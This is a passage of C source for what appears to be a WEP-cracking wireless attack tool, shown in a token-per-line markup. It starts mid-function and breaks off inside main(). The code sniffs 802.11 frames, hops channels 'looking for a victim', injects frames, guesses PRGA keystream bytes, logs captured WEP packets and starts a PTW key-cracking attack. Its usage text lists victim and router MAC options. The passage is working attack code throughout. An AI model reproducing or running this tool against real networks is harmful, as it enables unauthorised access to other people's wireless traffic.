operator|->
name|ether_type
argument_list|)
argument_list|)
expr_stmt|;
name|ptr
operator|+=
literal|8
expr_stmt|;
name|memcpy
argument_list|(
name|ptr
argument_list|,
operator|&
name|buf
index|[
sizeof|sizeof
argument_list|(
operator|*
name|eh
argument_list|)
index|]
argument_list|,
name|dlen
argument_list|)
expr_stmt|;
name|wepify
argument_list|(
name|body
argument_list|,
literal|8
operator|+
name|dlen
argument_list|)
expr_stmt|;
name|taptx_len
operator|=
sizeof|sizeof
argument_list|(
operator|*
name|wh
argument_list|)
operator|+
literal|4
operator|+
literal|8
operator|+
name|dlen
operator|+
literal|4
expr_stmt|;
name|assert
argument_list|(
name|taptx_len
operator|<
sizeof|sizeof
argument_list|(
name|taptx
argument_list|)
argument_list|)
expr_stmt|;
block|}
end_function

begin_function
name|int
name|elapsedd
parameter_list|(
name|struct
name|timeval
modifier|*
name|past
parameter_list|,
name|struct
name|timeval
modifier|*
name|now
parameter_list|)
block|{
name|int
name|el
decl_stmt|;
name|el
operator|=
name|now
operator|->
name|tv_sec
operator|-
name|past
operator|->
name|tv_sec
expr_stmt|;
name|assert
argument_list|(
name|el
operator|>=
literal|0
argument_list|)
expr_stmt|;
if|if
condition|(
name|el
operator|==
literal|0
condition|)
block|{
name|el
operator|=
name|now
operator|->
name|tv_usec
operator|-
name|past
operator|->
name|tv_usec
expr_stmt|;
block|}
else|else
block|{
name|el
operator|=
operator|(
name|el
operator|-
literal|1
operator|)
operator|*
literal|1000
operator|*
literal|1000
expr_stmt|;
name|el
operator|+=
literal|1000
operator|*
literal|1000
operator|-
name|past
operator|->
name|tv_usec
expr_stmt|;
name|el
operator|+=
name|now
operator|->
name|tv_usec
expr_stmt|;
block|}
return|return
name|el
return|;
block|}
end_function

begin_function
specifier|static
name|unsigned
name|char
modifier|*
name|get_80211
parameter_list|(
name|unsigned
name|char
modifier|*
modifier|*
name|data
parameter_list|,
name|int
modifier|*
name|totlen
parameter_list|,
name|int
modifier|*
name|plen
parameter_list|)
block|{
define|#
directive|define
name|BIT
parameter_list|(
name|n
parameter_list|)
value|(1<<(n))
name|struct
name|bpf_hdr
modifier|*
name|bpfh
decl_stmt|;
name|struct
name|ieee80211_radiotap_header
modifier|*
name|rth
decl_stmt|;
name|uint32_t
name|present
decl_stmt|;
name|uint8_t
name|rflags
decl_stmt|;
name|void
modifier|*
name|ptr
decl_stmt|;
specifier|static
name|int
name|nocrc
init|=
literal|0
decl_stmt|;
name|assert
argument_list|(
operator|*
name|totlen
argument_list|)
expr_stmt|;
comment|/* bpf hdr */
name|bpfh
operator|=
operator|(
expr|struct
name|bpf_hdr
operator|*
operator|)
operator|(
operator|*
name|data
operator|)
expr_stmt|;
name|assert
argument_list|(
name|bpfh
operator|->
name|bh_caplen
operator|==
name|bpfh
operator|->
name|bh_datalen
argument_list|)
expr_stmt|;
comment|/* XXX */
operator|*
name|totlen
operator|-=
name|bpfh
operator|->
name|bh_hdrlen
expr_stmt|;
comment|/* check if more packets */
if|if
condition|(
operator|(
name|int
operator|)
name|bpfh
operator|->
name|bh_caplen
operator|<
operator|*
name|totlen
condition|)
block|{
name|int
name|tot
init|=
name|bpfh
operator|->
name|bh_hdrlen
operator|+
name|bpfh
operator|->
name|bh_caplen
decl_stmt|;
name|int
name|offset
init|=
name|BPF_WORDALIGN
argument_list|(
name|tot
argument_list|)
decl_stmt|;
operator|*
name|data
operator|=
operator|(
name|char
operator|*
operator|)
name|bpfh
operator|+
name|offset
expr_stmt|;
operator|*
name|totlen
operator|-=
name|offset
operator|-
name|tot
expr_stmt|;
comment|/* take into account align bytes */
block|}
elseif|else
if|if
condition|(
operator|(
name|int
operator|)
name|bpfh
operator|->
name|bh_caplen
operator|>
operator|*
name|totlen
condition|)
name|abort
argument_list|()
expr_stmt|;
operator|*
name|plen
operator|=
name|bpfh
operator|->
name|bh_caplen
expr_stmt|;
operator|*
name|totlen
operator|-=
name|bpfh
operator|->
name|bh_caplen
expr_stmt|;
name|assert
argument_list|(
operator|*
name|totlen
operator|>=
literal|0
argument_list|)
expr_stmt|;
comment|/* radiotap */
name|rth
operator|=
operator|(
expr|struct
name|ieee80211_radiotap_header
operator|*
operator|)
operator|(
operator|(
name|char
operator|*
operator|)
name|bpfh
operator|+
name|bpfh
operator|->
name|bh_hdrlen
operator|)
expr_stmt|;
comment|/* XXX cache; drivers won't change this per-packet */
comment|/* check if FCS/CRC is included in packet */
name|present
operator|=
name|le32toh
argument_list|(
name|rth
operator|->
name|it_present
argument_list|)
expr_stmt|;
if|if
condition|(
name|present
operator|&
name|BIT
argument_list|(
name|IEEE80211_RADIOTAP_FLAGS
argument_list|)
condition|)
block|{
if|if
condition|(
name|present
operator|&
name|BIT
argument_list|(
name|IEEE80211_RADIOTAP_TSFT
argument_list|)
condition|)
name|rflags
operator|=
operator|(
operator|(
specifier|const
name|uint8_t
operator|*
operator|)
name|rth
operator|)
index|[
literal|8
index|]
expr_stmt|;
else|else
name|rflags
operator|=
operator|(
operator|(
specifier|const
name|uint8_t
operator|*
operator|)
name|rth
operator|)
index|[
literal|0
index|]
expr_stmt|;
block|}
else|else
name|rflags
operator|=
literal|0
expr_stmt|;
operator|*
name|plen
operator|-=
name|rth
operator|->
name|it_len
expr_stmt|;
name|assert
argument_list|(
operator|*
name|plen
operator|>
literal|0
argument_list|)
expr_stmt|;
comment|/* 802.11 CRC */
if|if
condition|(
name|nocrc
operator|||
operator|(
name|rflags
operator|&
name|IEEE80211_RADIOTAP_F_FCS
operator|)
condition|)
block|{
operator|*
name|plen
operator|-=
name|IEEE80211_CRC_LEN
expr_stmt|;
name|nocrc
operator|=
literal|1
expr_stmt|;
block|}
name|ptr
operator|=
operator|(
name|char
operator|*
operator|)
name|rth
operator|+
name|rth
operator|->
name|it_len
expr_stmt|;
return|return
name|ptr
return|;
undef|#
directive|undef
name|BIT
block|}
end_function

begin_function
specifier|static
name|int
name|read_packet
parameter_list|(
name|int
name|fd
parameter_list|,
name|unsigned
name|char
modifier|*
name|dst
parameter_list|,
name|int
name|len
parameter_list|)
block|{
specifier|static
name|unsigned
name|char
name|buf
index|[
literal|4096
index|]
decl_stmt|;
specifier|static
name|int
name|totlen
init|=
literal|0
decl_stmt|;
specifier|static
name|unsigned
name|char
modifier|*
name|next
init|=
name|buf
decl_stmt|;
name|unsigned
name|char
modifier|*
name|pkt
decl_stmt|;
name|int
name|plen
decl_stmt|;
name|assert
argument_list|(
name|len
operator|>
literal|0
argument_list|)
expr_stmt|;
comment|/* need to read more */
if|if
condition|(
name|totlen
operator|==
literal|0
condition|)
block|{
name|totlen
operator|=
name|read
argument_list|(
name|fd
argument_list|,
name|buf
argument_list|,
sizeof|sizeof
argument_list|(
name|buf
argument_list|)
argument_list|)
expr_stmt|;
if|if
condition|(
name|totlen
operator|==
operator|-
literal|1
condition|)
block|{
name|totlen
operator|=
literal|0
expr_stmt|;
return|return
operator|-
literal|1
return|;
block|}
name|next
operator|=
name|buf
expr_stmt|;
block|}
comment|/* read 802.11 packet */
name|pkt
operator|=
name|get_80211
argument_list|(
operator|&
name|next
argument_list|,
operator|&
name|totlen
argument_list|,
operator|&
name|plen
argument_list|)
expr_stmt|;
if|if
condition|(
name|plen
operator|>
name|len
condition|)
name|plen
operator|=
name|len
expr_stmt|;
name|assert
argument_list|(
name|plen
operator|>
literal|0
argument_list|)
expr_stmt|;
name|memcpy
argument_list|(
name|dst
argument_list|,
name|pkt
argument_list|,
name|plen
argument_list|)
expr_stmt|;
return|return
name|plen
return|;
block|}
end_function

begin_function
name|void
name|own
parameter_list|(
name|int
name|wifd
parameter_list|)
block|{
name|unsigned
name|char
name|buf
index|[
literal|4096
index|]
decl_stmt|;
name|int
name|rd
decl_stmt|;
name|fd_set
name|rfd
decl_stmt|;
name|struct
name|timeval
name|tv
decl_stmt|;
name|char
modifier|*
name|pbar
init|=
literal|"/-\\|"
decl_stmt|;
name|char
modifier|*
name|pbarp
init|=
operator|&
name|pbar
index|[
literal|0
index|]
decl_stmt|;
name|struct
name|timeval
name|lasthop
decl_stmt|;
name|struct
name|timeval
name|now
decl_stmt|;
name|unsigned
name|int
name|last_wep_count
init|=
literal|0
decl_stmt|;
name|struct
name|timeval
name|last_wcount
decl_stmt|;
name|struct
name|timeval
name|last_status
decl_stmt|;
name|int
name|fd
decl_stmt|;
name|int
name|largest
decl_stmt|;
name|weplog
operator|.
name|fd
operator|=
name|open
argument_list|(
name|WEP_FILE
argument_list|,
name|O_WRONLY
operator||
name|O_APPEND
argument_list|)
expr_stmt|;
if|if
condition|(
name|weplog
operator|.
name|fd
operator|==
operator|-
literal|1
condition|)
block|{
name|struct
name|pcap_file_header
name|pfh
decl_stmt|;
name|memset
argument_list|(
operator|&
name|pfh
argument_list|,
literal|0
argument_list|,
sizeof|sizeof
argument_list|(
name|pfh
argument_list|)
argument_list|)
expr_stmt|;
name|pfh
operator|.
name|magic
operator|=
name|TCPDUMP_MAGIC
expr_stmt|;
name|pfh
operator|.
name|version_major
operator|=
name|PCAP_VERSION_MAJOR
expr_stmt|;
name|pfh
operator|.
name|version_minor
operator|=
name|PCAP_VERSION_MINOR
expr_stmt|;
name|pfh
operator|.
name|thiszone
operator|=
literal|0
expr_stmt|;
name|pfh
operator|.
name|sigfigs
operator|=
literal|0
expr_stmt|;
name|pfh
operator|.
name|snaplen
operator|=
literal|65535
expr_stmt|;
name|pfh
operator|.
name|linktype
operator|=
name|LINKTYPE_IEEE802_11
expr_stmt|;
name|weplog
operator|.
name|fd
operator|=
name|open
argument_list|(
name|WEP_FILE
argument_list|,
name|O_WRONLY
operator||
name|O_CREAT
argument_list|,
name|S_IRUSR
operator||
name|S_IWUSR
operator||
name|S_IRGRP
operator||
name|S_IROTH
argument_list|)
expr_stmt|;
if|if
condition|(
name|weplog
operator|.
name|fd
operator|!=
operator|-
literal|1
condition|)
block|{
if|if
condition|(
name|write
argument_list|(
name|weplog
operator|.
name|fd
argument_list|,
operator|&
name|pfh
argument_list|,
sizeof|sizeof
argument_list|(
name|pfh
argument_list|)
argument_list|)
operator|!=
sizeof|sizeof
argument_list|(
name|pfh
argument_list|)
condition|)
name|err
argument_list|(
literal|1
argument_list|,
literal|"write()"
argument_list|)
expr_stmt|;
block|}
block|}
else|else
block|{
name|time_print
argument_list|(
literal|"WARNING: Appending in %s\n"
argument_list|,
name|WEP_FILE
argument_list|)
expr_stmt|;
block|}
if|if
condition|(
name|weplog
operator|.
name|fd
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"open()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|fd
operator|=
name|open
argument_list|(
name|PRGA_FILE
argument_list|,
name|O_RDONLY
argument_list|)
expr_stmt|;
if|if
condition|(
name|fd
operator|!=
operator|-
literal|1
condition|)
block|{
name|time_print
argument_list|(
literal|"WARNING: reading prga from %s\n"
argument_list|,
name|PRGA_FILE
argument_list|)
expr_stmt|;
name|rd
operator|=
name|read
argument_list|(
name|fd
argument_list|,
name|buf
argument_list|,
sizeof|sizeof
argument_list|(
name|buf
argument_list|)
argument_list|)
expr_stmt|;
if|if
condition|(
name|rd
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"read()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
if|if
condition|(
name|rd
operator|>=
literal|8
condition|)
block|{
name|set_prga
argument_list|(
name|buf
argument_list|,
name|NULL
argument_list|,
operator|&
name|buf
index|[
literal|3
index|]
argument_list|,
name|rd
operator|-
literal|3
argument_list|)
expr_stmt|;
block|}
name|close
argument_list|(
name|fd
argument_list|)
expr_stmt|;
block|}
name|fd
operator|=
name|open
argument_list|(
name|DICT_PATH
argument_list|,
name|O_RDONLY
argument_list|)
expr_stmt|;
if|if
condition|(
name|fd
operator|==
operator|-
literal|1
condition|)
block|{
name|time_print
argument_list|(
literal|"Creating dictionary directory (%s)\n"
argument_list|,
name|DICT_PATH
argument_list|)
expr_stmt|;
if|if
condition|(
name|mkdir
argument_list|(
name|DICT_PATH
argument_list|,
literal|0755
argument_list|)
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"mkdir()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
block|}
else|else
name|close
argument_list|(
name|fd
argument_list|)
expr_stmt|;
name|open_tap
argument_list|()
expr_stmt|;
name|set_if_mac
argument_list|(
name|mymac
argument_list|,
name|tapdev
argument_list|)
expr_stmt|;
name|time_print
argument_list|(
literal|"Set tap MAC to: %s\n"
argument_list|,
name|mac2str
argument_list|(
name|mymac
argument_list|)
argument_list|)
expr_stmt|;
if|if
condition|(
name|tapfd
operator|>
name|wifd
condition|)
name|largest
operator|=
name|tapfd
expr_stmt|;
else|else
name|largest
operator|=
name|wifd
expr_stmt|;
if|if
condition|(
name|signal
argument_list|(
name|SIGINT
argument_list|,
operator|&
name|cleanup
argument_list|)
operator|==
name|SIG_ERR
condition|)
block|{
name|perror
argument_list|(
literal|"signal()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
if|if
condition|(
name|signal
argument_list|(
name|SIGTERM
argument_list|,
operator|&
name|cleanup
argument_list|)
operator|==
name|SIG_ERR
condition|)
block|{
name|perror
argument_list|(
literal|"signal()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|time_print
argument_list|(
literal|"Looking for a victim...\n"
argument_list|)
expr_stmt|;
if|if
condition|(
name|gettimeofday
argument_list|(
operator|&
name|lasthop
argument_list|,
name|NULL
argument_list|)
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"gettimeofday()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|memcpy
argument_list|(
operator|&
name|last_wcount
argument_list|,
operator|&
name|lasthop
argument_list|,
sizeof|sizeof
argument_list|(
name|last_wcount
argument_list|)
argument_list|)
expr_stmt|;
name|memcpy
argument_list|(
operator|&
name|last_status
argument_list|,
operator|&
name|lasthop
argument_list|,
sizeof|sizeof
argument_list|(
name|last_status
argument_list|)
argument_list|)
expr_stmt|;
while|while
condition|(
literal|1
condition|)
block|{
if|if
condition|(
name|gettimeofday
argument_list|(
operator|&
name|now
argument_list|,
name|NULL
argument_list|)
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"gettimeofday()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
comment|/* check for relay timeout */
if|if
condition|(
name|fragstate
operator|.
name|waiting_relay
condition|)
block|{
name|int
name|el
decl_stmt|;
name|el
operator|=
name|now
operator|.
name|tv_sec
operator|-
name|fragstate
operator|.
name|last
operator|.
name|tv_sec
expr_stmt|;
name|assert
argument_list|(
name|el
operator|>=
literal|0
argument_list|)
expr_stmt|;
if|if
condition|(
name|el
operator|==
literal|0
condition|)
block|{
name|el
operator|=
name|now
operator|.
name|tv_usec
operator|-
name|fragstate
operator|.
name|last
operator|.
name|tv_usec
expr_stmt|;
block|}
else|else
block|{
name|el
operator|--
expr_stmt|;
name|el
operator|*=
literal|1000
operator|*
literal|1000
expr_stmt|;
name|el
operator|+=
literal|1000
operator|*
literal|1000
operator|-
name|fragstate
operator|.
name|last
operator|.
name|tv_usec
expr_stmt|;
name|el
operator|+=
name|now
operator|.
name|tv_usec
expr_stmt|;
if|if
condition|(
name|el
operator|>
operator|(
literal|1500
operator|*
literal|1000
operator|)
condition|)
block|{
comment|//					printf("\nLAMER timeout\n\n");
name|free
argument_list|(
name|fragstate
operator|.
name|data
argument_list|)
expr_stmt|;
name|fragstate
operator|.
name|data
operator|=
literal|0
expr_stmt|;
block|}
block|}
block|}
comment|/* check for arp timeout */
if|if
condition|(
name|rtrmac
operator|==
operator|(
name|unsigned
name|char
operator|*
operator|)
literal|1
condition|)
block|{
name|int
name|el
decl_stmt|;
name|el
operator|=
name|elapsedd
argument_list|(
operator|&
name|arpsend
argument_list|,
operator|&
name|now
argument_list|)
expr_stmt|;
if|if
condition|(
name|el
operator|>=
operator|(
literal|1500
operator|*
literal|1000
operator|)
condition|)
block|{
name|rtrmac
operator|=
literal|0
expr_stmt|;
block|}
block|}
comment|// status bar
if|if
condition|(
operator|(
name|now
operator|.
name|tv_sec
operator|>
name|last_status
operator|.
name|tv_sec
operator|)
operator|||
operator|(
name|now
operator|.
name|tv_usec
operator|-
name|last_status
operator|.
name|tv_usec
operator|>
literal|100
operator|*
literal|1000
operator|)
condition|)
block|{
if|if
condition|(
name|crack_pid
operator|&&
operator|(
name|now
operator|.
name|tv_sec
operator|>
name|last_status
operator|.
name|tv_sec
operator|)
condition|)
block|{
name|check_key
argument_list|()
expr_stmt|;
block|}
if|if
condition|(
name|netip
operator|&&
name|prgainfo
operator|.
name|len
operator|>=
name|min_prga
operator|&&
name|rtrmac
operator|>
operator|(
name|unsigned
name|char
operator|*
operator|)
literal|1
condition|)
block|{
name|time_print
argument_list|(
literal|"WEP=%.9d (next crack at %d) IV=%.2x:%.2x:%.2x (rate=%d)         \r"
argument_list|,
name|weplog
operator|.
name|packets
argument_list|,
name|wep_thresh
argument_list|,
name|weplog
operator|.
name|iv
index|[
literal|0
index|]
argument_list|,
name|weplog
operator|.
name|iv
index|[
literal|1
index|]
argument_list|,
name|weplog
operator|.
name|iv
index|[
literal|2
index|]
argument_list|,
name|weplog
operator|.
name|rate
argument_list|)
expr_stmt|;
name|fflush
argument_list|(
name|stdout
argument_list|)
expr_stmt|;
block|}
else|else
block|{
if|if
condition|(
name|state
operator|==
name|FIND_VICTIM
condition|)
name|time_print
argument_list|(
literal|"Chan %.02d %c\r"
argument_list|,
name|chaninfo
operator|.
name|chan
argument_list|,
operator|*
name|pbarp
argument_list|)
expr_stmt|;
elseif|else
if|if
condition|(
name|decryptstate
operator|.
name|cipher
condition|)
block|{
name|int
name|pos
init|=
name|decryptstate
operator|.
name|prgainfo
operator|.
name|len
operator|-
literal|1
decl_stmt|;
name|unsigned
name|char
name|prga
init|=
name|decryptstate
operator|.
name|prgainfo
operator|.
name|prga
index|[
name|pos
index|]
decl_stmt|;
name|assert
argument_list|(
name|pos
argument_list|)
expr_stmt|;
name|time_print
argument_list|(
literal|"Guessing PRGA %.2x (IP byte=%d)    \r"
argument_list|,
name|prga
argument_list|,
name|decryptstate
operator|.
name|cipher
index|[
name|pos
index|]
operator|^
name|prga
argument_list|)
expr_stmt|;
block|}
else|else
name|time_print
argument_list|(
literal|"%c\r"
argument_list|,
operator|*
name|pbarp
argument_list|)
expr_stmt|;
name|fflush
argument_list|(
name|stdout
argument_list|)
expr_stmt|;
block|}
name|memcpy
argument_list|(
operator|&
name|last_status
argument_list|,
operator|&
name|now
argument_list|,
sizeof|sizeof
argument_list|(
name|last_status
argument_list|)
argument_list|)
expr_stmt|;
block|}
comment|// check if we are cracking
if|if
condition|(
name|crack_pid
condition|)
block|{
if|if
condition|(
name|now
operator|.
name|tv_sec
operator|-
name|crack_start
operator|.
name|tv_sec
operator|>=
name|crack_dur
condition|)
name|kill_crack
argument_list|()
expr_stmt|;
block|}
comment|// check TX  / retransmit
if|if
condition|(
name|txstate
operator|.
name|waiting_ack
condition|)
block|{
name|unsigned
name|int
name|elapsed
init|=
name|now
operator|.
name|tv_sec
operator|-
name|txstate
operator|.
name|tsent
operator|.
name|tv_sec
decl_stmt|;
name|elapsed
operator|*=
literal|1000
operator|*
literal|1000
expr_stmt|;
name|elapsed
operator|+=
operator|(
name|now
operator|.
name|tv_usec
operator|-
name|txstate
operator|.
name|tsent
operator|.
name|tv_usec
operator|)
expr_stmt|;
if|if
condition|(
name|elapsed
operator|>=
name|ack_timeout
condition|)
name|send_frame
argument_list|(
name|wifd
argument_list|,
name|NULL
argument_list|,
operator|-
literal|1
argument_list|)
expr_stmt|;
block|}
comment|// INPUT
comment|// select
name|FD_ZERO
argument_list|(
operator|&
name|rfd
argument_list|)
expr_stmt|;
name|FD_SET
argument_list|(
name|wifd
argument_list|,
operator|&
name|rfd
argument_list|)
expr_stmt|;
name|FD_SET
argument_list|(
name|tapfd
argument_list|,
operator|&
name|rfd
argument_list|)
expr_stmt|;
name|tv
operator|.
name|tv_sec
operator|=
literal|0
expr_stmt|;
name|tv
operator|.
name|tv_usec
operator|=
literal|1000
operator|*
literal|10
expr_stmt|;
name|rd
operator|=
name|select
argument_list|(
name|largest
operator|+
literal|1
argument_list|,
operator|&
name|rfd
argument_list|,
name|NULL
argument_list|,
name|NULL
argument_list|,
operator|&
name|tv
argument_list|)
expr_stmt|;
if|if
condition|(
name|rd
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"select()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
comment|// read
if|if
condition|(
name|rd
operator|!=
literal|0
condition|)
block|{
comment|// wifi
if|if
condition|(
name|FD_ISSET
argument_list|(
name|wifd
argument_list|,
operator|&
name|rfd
argument_list|)
condition|)
block|{
name|rd
operator|=
name|read_packet
argument_list|(
name|wifd
argument_list|,
name|buf
argument_list|,
sizeof|sizeof
argument_list|(
name|buf
argument_list|)
argument_list|)
expr_stmt|;
if|if
condition|(
name|rd
operator|==
literal|0
condition|)
return|return;
if|if
condition|(
name|rd
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"read()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|pbarp
operator|++
expr_stmt|;
if|if
condition|(
operator|!
operator|(
operator|*
name|pbarp
operator|)
condition|)
name|pbarp
operator|=
operator|&
name|pbar
index|[
literal|0
index|]
expr_stmt|;
comment|// input
name|anal
argument_list|(
name|buf
argument_list|,
name|rd
argument_list|,
name|wifd
argument_list|)
expr_stmt|;
block|}
comment|// tap
if|if
condition|(
name|FD_ISSET
argument_list|(
name|tapfd
argument_list|,
operator|&
name|rfd
argument_list|)
condition|)
block|{
name|read_tap
argument_list|()
expr_stmt|;
block|}
block|}
comment|// check state and what we do next.
if|if
condition|(
name|state
operator|==
name|FIND_VICTIM
condition|)
block|{
if|if
condition|(
name|now
operator|.
name|tv_sec
operator|>
name|lasthop
operator|.
name|tv_sec
operator|||
operator|(
operator|(
name|now
operator|.
name|tv_usec
operator|-
name|lasthop
operator|.
name|tv_usec
operator|)
operator|>=
literal|300
operator|*
literal|1000
operator|)
condition|)
block|{
name|int
name|chan
init|=
name|chaninfo
operator|.
name|chan
decl_stmt|;
name|chan
operator|++
expr_stmt|;
if|if
condition|(
name|chan
operator|>
name|max_chan
condition|)
name|chan
operator|=
literal|1
expr_stmt|;
name|set_chan
argument_list|(
name|chan
argument_list|)
expr_stmt|;
name|memcpy
argument_list|(
operator|&
name|lasthop
argument_list|,
operator|&
name|now
argument_list|,
sizeof|sizeof
argument_list|(
name|lasthop
argument_list|)
argument_list|)
expr_stmt|;
block|}
block|}
else|else
block|{
comment|// check if we need to write something...
if|if
condition|(
operator|!
name|txstate
operator|.
name|waiting_ack
condition|)
name|can_write
argument_list|(
name|wifd
argument_list|)
expr_stmt|;
comment|// roughly!
ifdef|#
directive|ifdef
name|MORE_ACCURATE
if|if
condition|(
operator|(
name|now
operator|.
name|tv_sec
operator|-
name|last_wcount
operator|.
name|tv_sec
operator|)
operator|>=
literal|2
condition|)
block|{
name|unsigned
name|int
name|elapsed
decl_stmt|;
name|int
name|secs
decl_stmt|;
name|int
name|packetz
init|=
name|weplog
operator|.
name|packets
operator|-
name|last_wep_count
decl_stmt|;
name|elapsed
operator|=
literal|1000
operator|*
literal|1000
expr_stmt|;
name|elapsed
operator|-=
name|last_wcount
operator|.
name|tv_usec
expr_stmt|;
name|assert
argument_list|(
name|elapsed
operator|>=
literal|0
argument_list|)
expr_stmt|;
name|elapsed
operator|+=
name|now
operator|.
name|tv_usec
expr_stmt|;
name|secs
operator|=
name|now
operator|.
name|tv_sec
operator|-
name|last_wcount
operator|.
name|tv_sec
expr_stmt|;
name|secs
operator|--
expr_stmt|;
if|if
condition|(
name|secs
operator|>
literal|0
condition|)
name|elapsed
operator|+=
operator|(
name|secs
operator|*
literal|1000
operator|*
literal|1000
operator|)
expr_stmt|;
name|weplog
operator|.
name|rate
operator|=
call|(
name|int
call|)
argument_list|(
operator|(
name|double
operator|)
name|packetz
operator|/
operator|(
name|elapsed
operator|/
literal|1000.0
operator|/
literal|1000.0
operator|)
argument_list|)
expr_stmt|;
else|#
directive|else
if|if
condition|(
name|now
operator|.
name|tv_sec
operator|>
name|last_wcount
operator|.
name|tv_sec
condition|)
block|{
name|weplog
operator|.
name|rate
operator|=
name|weplog
operator|.
name|packets
operator|-
name|last_wep_count
expr_stmt|;
endif|#
directive|endif
name|last_wep_count
operator|=
name|weplog
operator|.
name|packets
expr_stmt|;
name|memcpy
argument_list|(
operator|&
name|last_wcount
argument_list|,
operator|&
name|now
argument_list|,
sizeof|sizeof
argument_list|(
name|now
argument_list|)
argument_list|)
expr_stmt|;
if|if
condition|(
name|wep_thresh
operator|!=
operator|-
literal|1
operator|&&
name|weplog
operator|.
name|packets
operator|>
name|wep_thresh
condition|)
name|try_crack
argument_list|()
expr_stmt|;
block|}
block|}
block|}
block|}
name|void
name|start
parameter_list|(
name|char
modifier|*
name|dev
parameter_list|)
block|{
name|int
name|fd
decl_stmt|;
name|setup_if
argument_list|(
name|dev
argument_list|)
expr_stmt|;
name|fd
operator|=
name|open_bpf
argument_list|(
name|dev
argument_list|,
name|DLT_IEEE802_11_RADIO
argument_list|)
expr_stmt|;
name|ptw
operator|=
name|PTW_newattackstate
argument_list|()
expr_stmt|;
if|if
condition|(
operator|!
name|ptw
condition|)
name|err
argument_list|(
literal|1
argument_list|,
literal|"PTW_newattackstate()"
argument_list|)
expr_stmt|;
name|own
argument_list|(
name|fd
argument_list|)
expr_stmt|;
if|#
directive|if
literal|0
block|{ 		int i; 		struct timeval tv; 		set_chan(11); 		for (i = 0; i< 10; i++) { 			gettimeofday(&tv, NULL);  			send_ack(tx);
comment|//			usleep(500);
block|printf("%lu\n", tv.tv_usec); 		}	 	}
endif|#
directive|endif
name|close
argument_list|(
name|fd
argument_list|)
expr_stmt|;
block|}
name|void
name|usage
parameter_list|(
name|char
modifier|*
name|pname
parameter_list|)
block|{
name|printf
argument_list|(
literal|"Usage: %s<opts>\n"
argument_list|,
name|pname
argument_list|)
expr_stmt|;
name|printf
argument_list|(
literal|"-h\t\tthis lame message\n"
argument_list|)
expr_stmt|;
name|printf
argument_list|(
literal|"-i\t\t<iface>\n"
argument_list|)
expr_stmt|;
name|printf
argument_list|(
literal|"-s\t\t<flood server ip>\n"
argument_list|)
expr_stmt|;
name|printf
argument_list|(
literal|"-m\t\t<my ip>\n"
argument_list|)
expr_stmt|;
name|printf
argument_list|(
literal|"-n\t\t<net ip>\n"
argument_list|)
expr_stmt|;
name|printf
argument_list|(
literal|"-r\t\t<rtr mac>\n"
argument_list|)
expr_stmt|;
name|printf
argument_list|(
literal|"-a\t\t<mymac>\n"
argument_list|)
expr_stmt|;
name|printf
argument_list|(
literal|"-c\t\tdo not crack\n"
argument_list|)
expr_stmt|;
name|printf
argument_list|(
literal|"-p\t\t<min prga>\n"
argument_list|)
expr_stmt|;
name|printf
argument_list|(
literal|"-4\t\t64 bit key\n"
argument_list|)
expr_stmt|;
name|printf
argument_list|(
literal|"-v\t\tvictim mac\n"
argument_list|)
expr_stmt|;
name|printf
argument_list|(
literal|"-t\t\t<crack thresh>\n"
argument_list|)
expr_stmt|;
name|printf
argument_list|(
literal|"-f\t\t<max chan>\n"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|0
argument_list|)
expr_stmt|;
block|}
name|void
name|str2mac
parameter_list|(
name|unsigned
name|char
modifier|*
name|dst
parameter_list|,
name|unsigned
name|char
modifier|*
name|mac
parameter_list|)
block|{
name|unsigned
name|int
name|macf
index|[
literal|6
index|]
decl_stmt|;
name|int
name|i
decl_stmt|;
if|if
condition|(
name|sscanf
argument_list|(
name|mac
argument_list|,
literal|"%x:%x:%x:%x:%x:%x"
argument_list|,
operator|&
name|macf
index|[
literal|0
index|]
argument_list|,
operator|&
name|macf
index|[
literal|1
index|]
argument_list|,
operator|&
name|macf
index|[
literal|2
index|]
argument_list|,
operator|&
name|macf
index|[
literal|3
index|]
argument_list|,
operator|&
name|macf
index|[
literal|4
index|]
argument_list|,
operator|&
name|macf
index|[
literal|5
index|]
argument_list|)
operator|!=
literal|6
condition|)
block|{
name|printf
argument_list|(
literal|"can't parse mac %s\n"
argument_list|,
name|mac
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
for|for
control|(
name|i
operator|=
literal|0
init|;
name|i
operator|<
literal|6
condition|;
name|i
operator|++
control|)
operator|*
name|dst
operator|++
operator|=
operator|(
name|unsigned
name|char
operator|)
name|macf
index|[
name|i
index|]
expr_stmt|;
block|}
name|int
name|main
parameter_list|(
name|int
name|argc
parameter_list|,
name|char
modifier|*
name|argv
index|[]
parameter_list|)
block|{
name|unsigned
name|char
modifier|*
name|dev
init|=
literal|"ath0"
decl_stmt|;
name|unsigned
name|char
name|rtr
index|[
literal|6
index|]
decl_stmt|;
name|unsigned
name|char
name|vic
index|[
literal|6
index|]
decl_stmt|;
name|int
name|ch
decl_stmt|;
if|if
condition|(
name|gettimeofday
argument_list|(
operator|&
name|real_start
argument_list|,
name|NULL
argument_list|)
operator|==
operator|-
literal|1
condition|)
block|{
